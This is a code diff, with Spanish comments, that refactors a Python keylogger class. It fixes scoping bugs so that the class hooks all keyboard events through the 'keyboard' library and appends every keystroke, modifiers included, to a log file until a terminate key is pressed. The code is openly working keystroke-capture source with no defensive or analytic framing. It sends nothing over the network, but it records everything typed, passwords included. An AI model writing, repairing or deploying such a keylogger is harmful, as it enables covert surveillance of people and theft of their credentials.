@@ -52,16 +52,11 @@
 from functools import partial
 import atexit
 import os
-
 import keyboard
 
 #######################################
 # #             Variables           # #
 #######################################
-MAP = {
-    "space": " ",
-    "\r": "\n"
-}
 
 #######################################
 # #              Clases             # #
@@ -83,33 +78,39 @@ class Keylogger:
     # Almacena si hay una tecla presionada.
     is_down = {}
 
+    # Traducción de carácteres para hacerlos imprimibles en texto plano.
+    MAP = {
+        "space": " ",
+        "\r": "\n"
+    }
+
     def __init__(self, file_path='keylogger.log', clear_on_startup=False, terminate_key=None):
         self.file_path = file_path
         self.clear_on_startup = clear_on_startup
         self.terminate_key = terminate_key
 
         # Se abre el archivo para escribir.
-        self.output = open(FILE_PATH, "a")
+        self.output = open(self.file_path, "a")
 
         # Elimina el archivo anterior con los registros del keylogger.
         if self.clear_on_startup:
             os.remove(self.file_path)
         
         # Se añade evento para cerrar el archivo al salir.
-        atexit.register(onexit)
+        atexit.register(self.onexit)
         
         # Se inicia la escucha de teclas.
-        keyboard.hook(partial(callback, self.is_down))
-        keyboard.wait(TERMINATE_KEY)
+        keyboard.hook(partial(self.callback))
+        keyboard.wait(self.terminate_key)
 
 
-    def callback(event):
+    def callback(self, event):
         """
         Esta función se ejecuta como callback cada vez que una tecla es pulsada recibiendo
         el evento y filtrando solo por las primeras pulsaciones (no las continuadas)
         """
         if event.event_type in ("up", "down"):
-            key = MAP.get(event.name, event.name)
+            key = self.MAP.get(event.name, event.name)
             modifier = len(key) > 1
 
             # Filtra el tipo de evento para solo contabilizar pulsaciones.
@@ -119,12 +120,13 @@ class Keylogger:
             # Cuando se mantiene presionada la misma tecla no se contabiliza.
             if modifier:
                 if event.event_type == "down":
-                    if is_down.get(key, False):
+                    if self.is_down.get(key, False):
                         return
                     else:
-                        is_down[key] = True
+                        self.is_down[key] = True
                 elif event.event_type == "up":
-                    is_down[key] = False
+                    self.is_down[key] = False
+                
                 # Indica si está siendo presionado.
                 key = " [{} ({})] ".format(key, event.event_type)
             elif key == "\r":
@@ -139,6 +141,7 @@ class Keylogger:
 
 
     def onexit(self):
+        """
+        Acciones al salir
+        """
         self.output.close()
-
-
